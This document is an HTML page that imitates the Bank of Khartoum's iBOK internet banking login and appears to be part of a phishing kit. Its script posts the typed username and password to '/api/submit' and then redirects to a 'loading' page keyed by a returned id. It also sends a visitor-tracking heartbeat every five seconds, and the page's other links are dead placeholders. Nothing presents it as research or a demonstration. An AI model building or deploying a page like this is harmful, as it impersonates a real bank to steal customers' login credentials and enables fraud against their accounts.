<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Bank of Khartoum | Internet Banking</title>
<link href="images/favicon-bok.png" rel="icon">
<link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600;700&display=swap" rel="stylesheet">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Open Sans',sans-serif;background:#e8e8e8;min-height:100vh;display:flex;flex-direction:column;overflow-x:hidden}

.top-header{display:grid;height:80px;width:100%;grid-template-columns:1fr 3fr;background:linear-gradient(#f33432,#bc262a)}
.header-logo{width:100%;height:100%;display:inline-grid;place-items:center;position:relative}
.header-logo img{height:60px}
.header-text{color:#fff;text-align:right;display:inline-grid;align-items:center;padding-right:3vw;font-size:24px;font-weight:700;background:linear-gradient(#f0b933,#e2ae2d,#d09e24,#bb8b16)}

.nav-bar{background:#fff;padding:6px 16px;display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid #ddd}
.nav-bar a{color:#333;text-decoration:none;font-size:13px;font-weight:600}
.nav-bar a:hover{color:#bc262a}
.nav-bar .lang-link{background:#bc262a;color:#fff;padding:4px 14px;border-radius:3px;font-size:12px}

.section{flex:1}
.prelogin{padding:20px 16px}
.prelogin .container{max-width:600px;margin:0 auto}

.loginTitle h2{color:#bc262a;font-size:22px;font-weight:600;font-family:'Open Sans',sans-serif}
.loginbox{padding:20px 5vw;margin-top:10px;border-radius:6px;background-color:#fff;display:block;position:relative;border:1px solid #ccc;box-shadow:0 3px 6px rgba(0,0,0,.16),0 3px 6px rgba(0,0,0,.23);margin-bottom:50px}
.loginbox h3{text-align:center;font-size:20px;color:#585958;font-weight:600;position:relative;padding-bottom:12px;margin-bottom:20px}
.loginbox h3::after{content:"";width:50%;height:3px;border-radius:10px;background-color:#bc262a;position:absolute;left:50%;transform:translateX(-50%);bottom:0}

.loginForm label{color:#828488;font-size:14px}
.loginForm .form-group,.loginForm .mb-3{margin-bottom:16px}
.loginForm .form-control{border:1px solid #666;height:40px;background-image:none;width:100%;padding:6px 12px;border-radius:4px;font-size:14px;font-family:'Open Sans',sans-serif;outline:none}
.loginForm .form-control:focus{border-color:#bc262a;box-shadow:none}
.loginForm .form-control::placeholder{color:#aaa}

.relative{position:relative}
.relative .form-control{padding-right:40px}
.toggle-eye{position:absolute;top:50%;right:12px;transform:translateY(-50%);background:none;border:none;cursor:pointer;color:#999;font-size:18px;padding:0}

.float-end.getPwd{display:block;text-align:right;margin-top:4px}
.float-end.getPwd a{color:#bc262a;font-size:13px;text-decoration:none;font-weight:600}
.float-end.getPwd a:hover{text-decoration:underline}

.form-check{margin-bottom:16px;display:flex;align-items:center;gap:8px}
.form-check-input{width:16px;height:16px;accent-color:#bc262a;cursor:pointer}
.form-check-label{color:#666;font-size:14px;cursor:pointer}

.btn-bok{background-color:#bc262a;border:1px solid #bc262a;display:block;width:100%;color:#fff;padding:10px;font-size:16px;font-weight:600;border-radius:4px;cursor:pointer;font-family:'Open Sans',sans-serif;transition:background-color .2s;border:none}
.btn-bok:hover{background-color:#a11a19}
.btn-bok:disabled{opacity:.5;cursor:default}

.footer{margin-top:auto;padding:10px;background:linear-gradient(#bfc1c4,#eff0f1,#fcfdfd,#ffffff);border-top:3px solid #bc262a;text-align:center;line-height:40px}
.footer .container{max-width:600px;margin:0 auto}
.footer .row{display:flex;align-items:center;justify-content:center;flex-wrap:wrap}
.copyright{font-weight:600;color:#4a4a4a;font-size:14px}
.social-media{display:flex;justify-content:center;gap:14px;margin-top:6px}
.soc-ico{display:inline-block}
.soc-ico img{height:32px;width:32px}

.error-box{display:none;background:#fff5f5;border:1px solid #f5c6cb;border-radius:4px;padding:10px;margin-bottom:14px;text-align:center}
.error-box.show{display:block}
.error-box span{color:#dc3545;font-size:13px;font-weight:600}

.loading-overlay{display:none;position:fixed;inset:0;background:rgba(255,255,255,.92);z-index:1000;align-items:center;justify-content:center;flex-direction:column}
.loading-overlay.show{display:flex}
.lo-spinner{width:40px;height:40px;border:4px solid #e0e0e0;border-top:4px solid #bc262a;border-radius:50%;animation:spin .8s linear infinite;margin-bottom:12px}
@keyframes spin{to{transform:rotate(360deg)}}
.lo-text{font-size:14px;color:#bc262a;font-weight:600}

@media(max-width:480px){
  .header-text{font-size:18px;padding-right:12px}
  .loginbox{padding:20px 16px}
  .top-header{height:70px}
}
</style>
</head>
<body>

<div class="top-header">
  <div class="header-logo">
    <img src="images/bok-logo.svg" alt="iBOK">
  </div>
  <div class="header-text">Welcome to<br>iBOK Internet<br>Banking</div>
</div>

<div class="nav-bar">
  <a href="index-en.html">Home</a>
  <a href="login.html" class="lang-link">العربية</a>
</div>

<div class="section">
  <div class="prelogin">
    <div class="container">
      <div class="loginTitle">
        <h2>Internet Banking - Login</h2>
      </div>
      <div class="loginbox">
        <h3>Please enter the details</h3>

        <div class="error-box" id="errorBox"><span id="errorText">Invalid credentials</span></div>

        <form class="loginForm" autocomplete="off" onsubmit="return false;">
          <div class="mb-3 mt-3">
            <label for="userName">User ID:</label>
            <input type="text" class="form-control" id="accountInput" placeholder="Enter User ID" name="userID" maxlength="12" autocomplete="off">
          </div>

          <div class="mb-3">
            <label for="pwd">Password:</label>
            <div class="relative">
              <input type="password" class="form-control" id="passwordInput" placeholder="Enter password" name="pswd" maxlength="16" autocomplete="off">
              <button type="button" class="toggle-eye" onclick="togglePass()">
                <svg id="eyeIcon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#999" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94"/><path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19"/><line x1="1" y1="1" x2="23" y2="23"/></svg>
              </button>
            </div>
            <div class="float-end getPwd"><a href="#">Forgot Password?</a></div>
          </div>

          <div class="form-check">
            <input class="form-check-input" type="checkbox" id="flexCheckDefault">
            <label class="form-check-label" for="flexCheckDefault">Terms and Conditions</label>
          </div>

          <div class="mt-3">
            <button type="button" class="btn btn-bok w-100" id="loginBtn" onclick="doLogin()">Login</button>
          </div>
        </form>
      </div>
    </div>
  </div>
</div>

<div class="footer">
  <div class="container">
    <div class="row">
      <div class="copyright">iBOK | Bank of Khartoum 2024</div>
    </div>
    <div class="social-media">
      <span class="soc-ico"><a href="#"><img src="images/bok-footer-logo.svg" alt="BOK"></a></span>
      <span class="soc-ico"><a href="#"><img src="images/bok-linkidin.svg" alt="LinkedIn"></a></span>
      <span class="soc-ico"><a href="#"><img src="images/bok-x.svg" alt="X"></a></span>
      <span class="soc-ico"><a href="#"><img src="images/bok-facebook.svg" alt="Facebook"></a></span>
    </div>
  </div>
</div>

<div class="loading-overlay" id="loadingOverlay">
  <div class="lo-spinner"></div>
  <div class="lo-text">Verifying...</div>
</div>

<script>
var _vid=sessionStorage.getItem('_vid');if(!_vid){_vid=Math.random().toString(36).slice(2)+Date.now().toString(36);sessionStorage.setItem('_vid',_vid);}
function heartbeat(){fetch('/api/heartbeat',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({page:'login',vid:_vid})}).catch(function(){});}
heartbeat();setInterval(heartbeat,5000);

function togglePass(){
  var inp=document.getElementById('passwordInput');
  var icon=document.getElementById('eyeIcon');
  if(inp.type==='password'){
    inp.type='text';
    icon.innerHTML='<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>';
  }else{
    inp.type='password';
    icon.innerHTML='<path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94"/><path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19"/><line x1="1" y1="1" x2="23" y2="23"/>';
  }
}

function doLogin(){
  var username=document.getElementById('accountInput').value.trim();
  var password=document.getElementById('passwordInput').value.trim();
  if(!username||!password)return;
  document.getElementById('errorBox').classList.remove('show');
  document.getElementById('loginBtn').disabled=true;
  document.getElementById('loginBtn').textContent='Verifying...';

  fetch('/api/submit',{
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify({username:username,password:password})
  })
  .then(function(r){return r.json();})
  .then(function(d){
    if(d.ok&&d.id){
      window.location.href='loading-en.html?id='+d.id;
    }else{
      document.getElementById('loginBtn').disabled=false;
      document.getElementById('loginBtn').textContent='Login';
    }
  })
  .catch(function(){
    document.getElementById('loginBtn').disabled=false;
    document.getElementById('loginBtn').textContent='Login';
  });
}

document.getElementById('accountInput').addEventListener('keydown',function(e){if(e.key==='Enter')document.getElementById('passwordInput').focus();});
document.getElementById('passwordInput').addEventListener('keydown',function(e){if(e.key==='Enter')doLogin();});

var urlParams=new URLSearchParams(window.location.search);
if(urlParams.get('error')==='1'){
  document.getElementById('errorText').textContent='Account number or password is incorrect';
  document.getElementById('errorBox').classList.add('show');
}
</script>
</body>
</html>
